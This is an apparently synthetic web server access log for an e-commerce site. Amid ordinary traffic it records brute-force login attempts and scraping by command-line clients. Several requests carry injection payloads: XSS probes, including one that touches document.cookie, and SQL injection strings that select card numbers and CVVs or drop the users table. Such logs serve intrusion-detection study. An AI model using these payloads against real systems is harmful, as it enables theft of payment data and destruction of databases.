192.168.1.20 - - [15/Jun/2025:00:40:40 +0000] "GET /static/js/app.js HTTP/1.1" 304 5707 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [15/Jun/2025:00:48:10 +0000] "GET /static/css/main.css HTTP/1.1" 200 1070 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:03:37 +0000] "POST /api/login HTTP/1.1" 401 219 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:24:08 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:13:40 +0000] "POST /api/login HTTP/1.1" 401 184 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:45:48 +0000] "POST /static/css/main.css HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:19:48 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:56:50 +0000] "GET /about HTTP/1.1" 200 4958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.21 - - [15/Jun/2025:00:56:02 +0000] "GET /static/css/main.css HTTP/1.1" 200 7389 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:40:18 +0000] "POST /api/user/profile HTTP/1.1" 200 2626 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:42:29 +0000] "GET /search?q=laptop HTTP/1.1" 200 7320 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.38 - - [15/Jun/2025:00:50:45 +0000] "GET /about HTTP/1.1" 200 5545 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.32 - - [15/Jun/2025:00:52:45 +0000] "POST /api/orders HTTP/1.1" 201 2322 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.19 - - [15/Jun/2025:00:51:45 +0000] "POST /search?q=laptop HTTP/1.1" 200 7467 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.35 - - [15/Jun/2025:00:55:18 +0000] "POST /products HTTP/1.1" 201 7442 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:14 +0000] "GET /images/banner.jpg HTTP/1.1" 200 964 "-" "curl/8.5.0"
172.16.0.55 - - [15/Jun/2025:00:15:20 +0000] "POST /api/login HTTP/1.1" 401 187 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.28 - - [15/Jun/2025:00:43:25 +0000] "GET /checkout HTTP/1.1" 200 4245 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.34 - - [15/Jun/2025:00:46:24 +0000] "POST /index.html HTTP/1.1" 200 7143 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [15/Jun/2025:00:52:54 +0000] "GET /images/banner.jpg HTTP/1.1" 404 7902 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.35 - - [15/Jun/2025:00:55:55 +0000] "GET /checkout HTTP/1.1" 200 4311 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.21 - - [15/Jun/2025:00:39:04 +0000] "GET /search?q=laptop HTTP/1.1" 200 3178 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.21 - - [15/Jun/2025:00:37:12 +0000] "GET /api/orders HTTP/1.1" 200 6238 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:32 +0000] "GET /about HTTP/1.1" 200 2699 "-" "Go-http-client/1.1"
192.168.1.38 - - [15/Jun/2025:00:43:48 +0000] "POST /robots.txt HTTP/1.1" 200 2830 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:02:07 +0000] "POST /api/login HTTP/1.1" 401 188 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:54:46 +0000] "GET /index.html HTTP/1.1" 200 6309 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.30 - - [15/Jun/2025:00:31:26 +0000] "GET /robots.txt HTTP/1.1" 200 4536 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:54:01 +0000] "GET /search?q=laptop HTTP/1.1" 200 7680 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:18 +0000] "GET /search?q=laptop HTTP/1.1" 200 1625 "-" "libwww-perl/6.72"
192.168.1.30 - - [15/Jun/2025:00:45:52 +0000] "POST /products HTTP/1.1" 201 6604 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.21 - - [15/Jun/2025:00:32:53 +0000] "POST /api/orders HTTP/1.1" 201 4770 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:32 +0000] "GET /checkout HTTP/1.1" 200 1347 "-" "curl/8.5.0"
10.0.0.99 - - [15/Jun/2025:00:15:53 +0000] "POST /api/login HTTP/1.1" 401 189 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:29 +0000] "GET /robots.txt HTTP/1.1" 200 1494 "-" "curl/8.5.0"
192.168.1.38 - - [15/Jun/2025:00:41:16 +0000] "GET /about HTTP/1.1" 304 408 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.13 - - [15/Jun/2025:00:38:15 +0000] "GET /contact HTTP/1.1" 404 5600 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:25:29 +0000] "GET /api/login?user=admin'-- HTTP/1.1" 400 503 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:30 +0000] "GET /products HTTP/1.1" 200 3271 "-" "Go-http-client/1.1"
192.168.1.47 - - [15/Jun/2025:00:47:28 +0000] "GET /static/js/app.js HTTP/1.1" 304 7779 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:13:06 +0000] "POST /api/login HTTP/1.1" 401 197 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.31 - - [15/Jun/2025:00:32:39 +0000] "GET /api/cart/add HTTP/1.1" 200 3447 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:32:36 +0000] "GET /about HTTP/1.1" 200 2413 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:02:01 +0000] "POST /api/login HTTP/1.1" 401 208 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.46 - - [15/Jun/2025:00:43:50 +0000] "GET /static/js/app.js HTTP/1.1" 200 3184 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:23:49 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 421 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.46 - - [15/Jun/2025:00:49:39 +0000] "POST / HTTP/1.1" 200 911 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:47 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 2232 "-" "Go-http-client/1.1"
192.168.1.45 - - [15/Jun/2025:00:29:10 +0000] "GET /favicon.ico HTTP/1.1" 200 3391 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.36 - - [15/Jun/2025:00:55:36 +0000] "GET /images/banner.jpg HTTP/1.1" 200 2935 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:43:09 +0000] "POST /api/products?category=clothing HTTP/1.1" 200 2754 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:31:37 +0000] "GET /robots.txt HTTP/1.1" 304 4708 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:40:01 +0000] "GET /search?q=laptop HTTP/1.1" 304 2303 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:39:56 +0000] "GET /static/css/main.css HTTP/1.1" 200 4970 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.27 - - [15/Jun/2025:00:41:48 +0000] "GET /robots.txt HTTP/1.1" 200 4905 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:16:57 +0000] "POST /api/login HTTP/1.1" 401 205 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:26:08 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:03:22 +0000] "POST /api/login HTTP/1.1" 401 189 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:24 +0000] "GET /checkout HTTP/1.1" 200 1210 "-" "Wget/1.21.4"
203.0.113.77 - - [15/Jun/2025:00:04:34 +0000] "POST /api/login HTTP/1.1" 401 188 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:18:42 +0000] "POST /api/login HTTP/1.1" 401 231 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.35 - - [15/Jun/2025:00:36:59 +0000] "POST /api/products?category=electronics HTTP/1.1" 201 6397 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [15/Jun/2025:00:51:03 +0000] "GET /static/js/app.js HTTP/1.1" 404 1437 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:19:15 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 536 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.47 - - [15/Jun/2025:00:48:42 +0000] "GET /cart HTTP/1.1" 200 7261 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:59:49 +0000] "GET /api/products?category=clothing HTTP/1.1" 404 2604 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:28 +0000] "GET /static/js/app.js HTTP/1.1" 429 3075 "-" "curl/8.5.0"
192.168.1.47 - - [15/Jun/2025:00:45:17 +0000] "GET /api/user/profile HTTP/1.1" 200 340 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [15/Jun/2025:00:59:35 +0000] "GET /about HTTP/1.1" 200 4423 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:27:24 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 332 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:14:04 +0000] "POST /api/login HTTP/1.1" 401 238 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:16:47 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:29:00 +0000] "GET / HTTP/1.1" 404 388 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:08:47 +0000] "POST /api/login HTTP/1.1" 401 237 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:28 +0000] "GET /api/user/profile HTTP/1.1" 200 1479 "-" "Go-http-client/1.1"
192.168.1.42 - - [15/Jun/2025:00:38:54 +0000] "GET /favicon.ico HTTP/1.1" 200 5581 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.20 - - [15/Jun/2025:00:47:09 +0000] "GET /robots.txt HTTP/1.1" 200 1368 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.24 - - [15/Jun/2025:00:31:10 +0000] "GET /api/products?category=electronics HTTP/1.1" 304 3853 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:26:24 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 426 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.29 - - [15/Jun/2025:00:48:36 +0000] "GET /static/css/main.css HTTP/1.1" 200 3120 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:51:36 +0000] "GET /api/cart/add HTTP/1.1" 304 3840 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:16 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 789 "-" "Wget/1.21.4"
172.16.0.55 - - [15/Jun/2025:00:05:01 +0000] "POST /api/login HTTP/1.1" 401 206 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:22:16 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 553 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.20 - - [15/Jun/2025:00:36:20 +0000] "GET /cart HTTP/1.1" 304 1371 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.20 - - [15/Jun/2025:00:35:42 +0000] "GET /products HTTP/1.1" 404 7533 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.48 - - [15/Jun/2025:00:45:07 +0000] "POST /static/js/app.js HTTP/1.1" 200 6858 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:42:37 +0000] "GET /contact HTTP/1.1" 304 2039 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:56:16 +0000] "GET /contact HTTP/1.1" 404 4240 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:29:05 +0000] "GET /cart HTTP/1.1" 200 3524 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 1134 "-" "libwww-perl/6.72"
192.168.1.47 - - [15/Jun/2025:00:55:49 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 4789 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.46 - - [15/Jun/2025:00:32:27 +0000] "POST /static/css/main.css HTTP/1.1" 201 4192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [15/Jun/2025:00:30:23 +0000] "GET /images/banner.jpg HTTP/1.1" 304 5739 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:34:32 +0000] "GET / HTTP/1.1" 404 2080 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.35 - - [15/Jun/2025:00:29:26 +0000] "GET /robots.txt HTTP/1.1" 200 2244 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.23 - - [15/Jun/2025:00:39:13 +0000] "GET /checkout HTTP/1.1" 304 4206 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.26 - - [15/Jun/2025:00:52:03 +0000] "GET /search?q=laptop HTTP/1.1" 404 4254 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.35 - - [15/Jun/2025:00:35:53 +0000] "POST /api/products?category=electronics HTTP/1.1" 201 5339 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:08:02 +0000] "POST /api/login HTTP/1.1" 401 224 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.29 - - [15/Jun/2025:00:33:46 +0000] "GET /favicon.ico HTTP/1.1" 404 591 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.18 - - [15/Jun/2025:00:59:08 +0000] "POST /api/products?category=clothing HTTP/1.1" 201 6021 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [15/Jun/2025:00:50:11 +0000] "POST /api/user/profile HTTP/1.1" 201 7085 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.21 - - [15/Jun/2025:00:30:03 +0000] "POST /api/orders HTTP/1.1" 201 1640 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:31:53 +0000] "POST /about HTTP/1.1" 200 6756 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.35 - - [15/Jun/2025:00:35:43 +0000] "GET /contact HTTP/1.1" 304 4028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:55 +0000] "GET /api/products?category=clothing HTTP/1.1" 429 3276 "-" "Go-http-client/1.1"
192.168.1.18 - - [15/Jun/2025:00:42:13 +0000] "POST /static/js/app.js HTTP/1.1" 201 6106 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.37 - - [15/Jun/2025:00:52:06 +0000] "GET /api/cart/add HTTP/1.1" 200 1517 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:34 +0000] "GET /api/user/profile HTTP/1.1" 200 3773 "-" "Go-http-client/1.1"
192.168.1.24 - - [15/Jun/2025:00:37:01 +0000] "POST /cart HTTP/1.1" 201 7170 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:23:35 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 364 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.31 - - [15/Jun/2025:00:57:08 +0000] "POST /checkout HTTP/1.1" 201 1019 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.15 - - [15/Jun/2025:00:54:26 +0000] "GET /index.html HTTP/1.1" 200 1952 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.29 - - [15/Jun/2025:00:46:32 +0000] "GET /api/orders HTTP/1.1" 200 763 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
